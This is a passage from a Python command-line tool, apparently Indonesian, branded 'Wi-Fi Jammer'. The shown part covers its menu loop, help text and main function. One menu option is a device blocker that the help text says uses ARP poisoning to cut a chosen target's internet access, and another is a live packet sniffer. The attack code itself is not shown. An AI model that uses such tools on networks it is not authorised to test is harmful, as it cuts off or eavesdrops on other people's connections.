{C['BOLD']}{C['R']}║{C['RESET']}     {C['BOLD']}{C['C']}{EMO['secure']} 🔒 HANYA UNTUK UJI KEAMANAN JARINGAN SENDIRI! 🔒 {EMO['secure']}{C['RESET']}                         {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}║{C['RESET']}                                                                                          {C['BOLD']}{C['R']}║
{C['BOLD']}{C['R']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

{C['C']}{EMO['net']} INTERFACE: {self.interface:<30} {EMO['device']} YOUR IP: {self.my_ip:<20}
{C['Y']}{EMO['router']} GATEWAY: {str(self.gateway_ip):<30} {EMO['shield']} STATUS: {'🟢 ACTIVE' if self.running else '🟡 IDLE'}

{C['BOLD']}{C['C']}{'═'*70}{C['RESET']}
{C['BOLD']}{C['G']}                                    MAIN MENU{C['RESET']}
{C['BOLD']}{C['C']}{'═'*70}{C['RESET']}

{C['BOLD']}{C['Y']}┌────────────────────────────────────────────────────────────────────┐{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}1.{C['RESET']} {EMO['scan']} ADVANCED NETWORK SCANNER      {C['G']}6.{C['RESET']} {EMO['packet']} LIVE PACKET SNIFFER        {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}2.{C['RESET']} {EMO['protect']} PRO ARP SPOOFING DETECTOR   {C['G']}7.{C['RESET']} {EMO['database']} VIEW ATTACK LOGS         {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}3.{C['RESET']} {EMO['attack']} POWERFUL DEVICE BLOCKER      {C['G']}8.{C['RESET']} {EMO['info']} SYSTEM INFORMATION       {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}4.{C['RESET']} {EMO['alert']} DEAUTH ATTACK DETECTOR       {C['G']}9.{C['RESET']} {EMO['back']} NETWORK BACKUP           {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['G']}5.{C['RESET']} {EMO['wifi']} WIFI NETWORK SCANNER         {C['G']}10.{C['RESET']}{EMO['info']} HELP & FITUR INFO      {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}│{C['RESET']}  {C['R']}0.{C['RESET']} {EMO['exit']} EXIT                                                          {C['BOLD']}{C['Y']}│{C['RESET']}
{C['BOLD']}{C['Y']}└────────────────────────────────────────────────────────────────────┘{C['RESET']}

{C['Y']}{EMO['warning']} Developer: HamzzXPP {C['RESET']}
{C['C']}{EMO['info']} 📋 Semua aktivitas dicatat di: {self.log_file}{C['RESET']}

{C['BOLD']}{C['C']}{'═'*70}{C['RESET']}
""")
            
            choice = input(f"{C['BOLD']}PILIH MENU (0-9): {C['RESET']}")
            
            if choice == '1':
                self.scan_network_advanced()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '2':
                self.arp_spoofing_detection_pro(60)
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '3':
                devices = self.scan_network_advanced()
                if devices:
                    print(f"\n{C['B']}Daftar device:{C['RESET']}")
                    for i, d in enumerate(devices, 1):
                        print(f"  {i}. {d['ip']} - {d['vendor']}")
                    target = input(f"\n{C['B']}IP target: {C['RESET']}")
                    self.block_device_powerful(target)
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '4':
                print(f"\n{C['Y']}{EMO['info']} Deauth Detection: Butuh monitor mode (Linux){C['RESET']}")
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '5':
                print(f"\n{C['Y']}{EMO['info']} WiFi Scanner: Butuh monitor mode (Linux){C['RESET']}")
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '6':
                count = input(f"{C['B']}Jumlah packets (default 200): {C['RESET']}")
                count = int(count) if count else 200
                self.packet_sniffer_live(count)
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '7':
                self.show_attack_logs()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '8':
                self.show_detailed_system_info()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '9':
                self.network_backup()
                input(f"\n{C['Y']}Tekan Enter untuk lanjut...{C['RESET']}")
            
            elif choice == '0':
                print(f"\n{C['G']}{EMO['check']} Restoring network and saving logs...{C['RESET']}")
                self.restore_network()
                print(f"{C['G']}{EMO['database']} Log saved: {self.log_file}{C['RESET']}")
                print(f"{C['G']}{EMO['check']} Terima kasih telah menggunakan Wi-Fi Jammer By HamzzXPP v1.0!{C['RESET']}\n")
                sys.exit(0)
                
            elif choice == '10':
                os.system('cls' if os.name == 'nt' else 'clear')
                print(f"""
{C['BOLD']}{C['C']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['C']}║                    📋 PENJELASAN LENGKAP FITUR Wi-Fi JAMMER v1.0                     ║
{C['BOLD']}{C['C']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 1: ADVANCED NETWORK SCANNER {C['Y']}🔍                                             ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Mendeteksi SEMUA perangkat yang terhubung ke WiFi Anda{C['RESET']}
{C['C']}  Cara kerja: Mengirim ARP request ke semua IP dalam jaringan{C['RESET']}
{C['C']}  Output:     IP Address, MAC Address, Device Type (99% akurat){C['RESET']}
{C['G']}  Kegunaan:   • Cek siapa saja yang pakai WiFi Anda{C['RESET']}
{C['G']}              • Deteksi perangkat tidak dikenal (pencuri WiFi){C['RESET']}
{C['G']}              • Identifikasi device (HP Samsung, Laptop Asus, dll){C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 2: PRO ARP SPOOFING DETECTOR {C['Y']}🛡️                                           ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Mendeteksi serangan Man-In-The-Middle (penyadap jaringan){C['RESET']}
{C['C']}  Cara kerja: Memonitor ARP traffic, mendeteksi MAC address palsu{C['RESET']}
{C['C']}  Output:     Peringatan jika ada yang mencoba menyadap{C['RESET']}
{C['G']}  Kegunaan:   • Proteksi dari hacker yang menyadap WiFi{C['RESET']}
{C['G']}              • Keamanan transaksi online (banking, belanja){C['RESET']}
{C['G']}              • Mengetahui jika ada serangan MITM{C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 3: POWERFUL DEVICE BLOCKER {C['Y']}⚔️                                           ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Memutus koneksi internet perangkat target (seperti NetCut){C['RESET']}
{C['C']}  Cara kerja: ARP Poisoning - Membuat target salah mengirim data{C['RESET']}
{C['C']}  Output:     Target kehilangan akses internet selama program jalan{C['RESET']}
{C['G']}  Kegunaan:   • Memblokir perangkat mencurigakan di WiFi Anda{C['RESET']}
{C['G']}              • Membatasi akses internet anak (waktu belajar){C['RESET']}
{C['G']}              • Testing keamanan jaringan sendiri{C['RESET']}
{C['R']}  ⚠️  HATI-HATI: Jangan block gateway atau IP sendiri!{C['RESET']}
{C['R']}  🛑  STOP: Tekan Ctrl+C untuk mengembalikan koneksi{C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 4: DEAUTH ATTACK DETECTOR {C['Y']}🚨                                           ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Mendeteksi serangan yang memutus koneksi WiFi (WiFi Killer){C['RESET']}
{C['C']}  Cara kerja: Memonitor packet deauthentication di udara{C['RESET']}
{C['C']}  Output:     Peringatan jika ada serangan deauth{C['RESET']}
{C['G']}  Kegunaan:   • Deteksi WiFi jammer di sekitar Anda{C['RESET']}
{C['G']}              • Proteksi dari serangan disconnect{C['RESET']}
{C['Y']}  ⚠️  Catatan: Butuh monitor mode (Linux/adaptor WiFi khusus){C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 5: WIFI NETWORK SCANNER {C['Y']}📶                                             ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Melihat semua jaringan WiFi di sekitar Anda{C['RESET']}
{C['C']}  Cara kerja: Sniffing beacon frames dari access point{C['RESET']}
{C['C']}  Output:     SSID, BSSID, Channel, Signal Strength{C['RESET']}
{C['G']}  Kegunaan:   • Cari jaringan WiFi terkuat{C['RESET']}
{C['G']}              • Deteksi WiFi palsu (Rogue AP){C['RESET']}
{C['G']}              • Analisis lingkungan WiFi{C['RESET']}
{C['Y']}  ⚠️  Catatan: Butuh monitor mode (Linux/adaptor WiFi khusus){C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 6: LIVE PACKET SNIFFER {C['Y']}📦                                           ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Melihat semua data yang lewat di jaringan Anda{C['RESET']}
{C['C']}  Cara kerja: Capture packet di interface jaringan{C['RESET']}
{C['C']}  Output:     TCP, UDP, ICMP packets + statistik lengkap{C['RESET']}
{C['G']}  Kegunaan:   • Analisis traffic jaringan{C['RESET']}
{C['G']}              • Debugging koneksi internet{C['RESET']}
{C['G']}              • Deteksi aktivitas mencurigakan{C['RESET']}
{C['Y']}  ⚠️  Catatan: Bisa melihat data orang lain (HANYA untuk jaringan sendiri!){C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 7: VIEW ATTACK LOGS {C['Y']}🗄️                                               ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Melihat semua aktivitas yang pernah dilakukan{C['RESET']}
{C['C']}  Cara kerja: Membaca file log JSON yang tersimpan{C['RESET']}
{C['C']}  Output:     Timestamp, Event Type, Target, Severity{C['RESET']}
{C['G']}  Kegunaan:   • Audit keamanan jaringan{C['RESET']}
{C['G']}              • Lihat riwayat serangan yang terdeteksi{C['RESET']}
{C['G']}              • Bukti aktivitas (penting untuk dokumentasi){C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 8: SYSTEM INFORMATION {C['Y']}ℹ️                                             ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Menampilkan informasi lengkap sistem dan jaringan{C['RESET']}
{C['C']}  Output:     Interface, IP, MAC, Gateway, OS, Python version{C['RESET']}
{C['G']}  Kegunaan:   • Cek konfigurasi jaringan Anda{C['RESET']}
{C['G']}              • Troubleshooting jika ada error{C['RESET']}
{C['G']}              • Monitoring status koneksi{C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 9: NETWORK BACKUP {C['Y']}💾                                               ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Menyimpan konfigurasi jaringan saat ini{C['RESET']}
{C['C']}  Output:     File backup .txt dengan semua setting network{C['RESET']}
{C['G']}  Kegunaan:   • Backup sebelum melakukan testing{C['RESET']}
{C['G']}              • Restore jika terjadi masalah{C['RESET']}
{C['G']}              • Dokumentasi konfigurasi{C['RESET']}

{C['BOLD']}{C['Y']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['Y']}║  {C['G']}MENU 0: EXIT {C['Y']}🚪                                                         ║
{C['BOLD']}{C['Y']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['C']}  Fungsi:     Keluar dari program{C['RESET']}
{C['C']}  Yang terjadi: Restore network → Save log → Exit{C['RESET']}
{C['G']}  Pastikan:    • Semua blocking dihentikan{C['RESET']}
{C['G']}               • Jaringan kembali normal{C['RESET']}
{C['G']}               • Log tersimpan untuk audit{C['RESET']}

{C['BOLD']}{C['R']}╔══════════════════════════════════════════════════════════════════════════════════════╗
{C['BOLD']}{C['R']}║  🚨 PERINGATAN PENTING! 🚨                                                           ║
{C['BOLD']}{C['R']}╚══════════════════════════════════════════════════════════════════════════════════════╝{C['RESET']}
{C['R']}  • Tools ini HANYA untuk jaringan SENDIRI!{C['RESET']}
{C['R']}  • Menggunakan di jaringan orang lain = TINDAKAN KRIMINAL!{C['RESET']}
{C['R']}  • Ancaman: PENJARA 8 TAHUN + DENDA Rp 10 MILIAR{C['RESET']}
{C['R']}  • Semua aktivitas ANDA tercatat dalam log file{C['RESET']}
{C['R']}  • Ctrl+C = Emergency stop (kembalikan semua ke normal){C['RESET']}

{C['BOLD']}{C['Y']}══════════════════════════════════════════════════════════════════════════════════════{C['RESET']}
{C['Y']}📞 Developer: Hamzah Wisnu Dzaky (HamzzXPP){C['RESET']}
{C['Y']}🔧 Version: 2.0 - ULTIMATE EDITION{C['RESET']}
{C['Y']}📅 Last Update: 2026{C['RESET']}

Tekan Enter untuk kembali ke menu utama...
""")
                input(f"\n{C['Y']}{C['RESET']}")
            
            else:
                print(f"{C['R']}Pilihan tidak valid!{C['RESET']}")
                time.sleep(1)

# ========== MAIN PROGRAM ==========
def main():
    print(f"\n{C['G']}{EMO['power']} Wi-Fi Jammer v1.0 - ULTIMATE EDITION {EMO['power']}{C['RESET']}")
    print(f"{C['Y']}Initializing security modules...{C['RESET']}\n")
    time.sleep(1)
    
    # Login system
    login = LoginSystem()
    if not login.login():
        print(f"{C['R']}Login failed! Exiting...{C['RESET']}")
        sys.exit(1)
    
    if not SCAPY_OK:
        print(f"{C['R']}Scapy not installed! Run: pip install scapy{C['RESET']}")
        sys.exit(1)
    
    # Create tester instance
    tester = UltimateNetworkTester()
    
    # Disclaimer
    print(f"{C['R']}{'='*70}{C['RESET']}")
    print(f"{C['R']}{EMO['danger']} DISCLAIMER ULTRA PENTING! {EMO['danger']}{C['RESET']}")
    print(f"{C['R']}{'='*70}{C['RESET']}")
    print(f"{C['Y']}1. Tools ini hanya untuk UJI KEAMANAN jaringan SENDIRI{C['RESET']}")
    print(f"{C['Y']}2. Menggunakan di jaringan orang lain = MELANGGAR HUKUM{C['RESET']}")
    print(f"{C['Y']}3. Semua aktivitas ANDA tercatat dalam log file{C['RESET']}")
    print(f"{C['Y']}4. Penyalahgunaan dapat dikenakan UU ITE Pasal 30-36{C['RESET']}")
    print(f"{C['Y']}5. Ancaman: PENJARA 8 TAHUN + DENDA Rp 10 MILIAR{C['RESET']}")
    print(f"{C['R']}{'='*70}{C['RESET']}")
    
    agree = input(f"\n{C['BOLD']}Apakah Anda memahami dan akan mematuhi? (yes/no): {C['RESET']}")
    if agree.lower() != 'yes':
        print(f"\n{C['R']}Program keluar. Gunakan secara bertanggung jawab!{C['RESET']}")
        sys.exit(0)
    
    try:
        tester.menu_ultimate()
    except KeyboardInterrupt:
        tester.restore_network()
        print(f"\n{C['Y']}{EMO['alert']} Program dihentikan oleh user{C['RESET']}")
        sys.exit(0)
    except Exception as e:
        print(f"{C['R']}Error: {e}{C['RESET']}")
        sys.exit(1)

if __name__ == "__main__":
    main()